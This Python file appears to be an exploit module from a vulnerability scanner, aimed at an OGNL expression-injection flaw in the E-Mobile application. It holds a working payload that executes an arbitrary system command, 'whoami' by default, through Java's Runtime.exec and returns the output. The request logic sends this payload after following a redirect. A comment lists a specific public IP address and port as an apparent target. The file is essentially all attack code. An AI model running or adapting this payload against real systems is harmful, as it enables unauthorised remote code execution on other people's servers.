# coding:utf-8
import requests


class Exploit:

    payload = {"message": '(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())', "cmd": "whoami"}

    def attack(self, url):
        response = requests.get(url, allow_redirects=False, cookies={"Cookie": "JSESSIONID=abczr1o15WhAahH88KK6v"})

        if response.status_code == 302:
            reqUrl = response.headers['Location']

            if reqUrl:
                retResponse = requests.post(reqUrl, data=self.payload,).text

                if len(retResponse) <= 200:
                    return "{} has E-Mobile Expression Injection".format(reqUrl)


# 'http://113.140.70.190:161'
# print Exploit().attack()
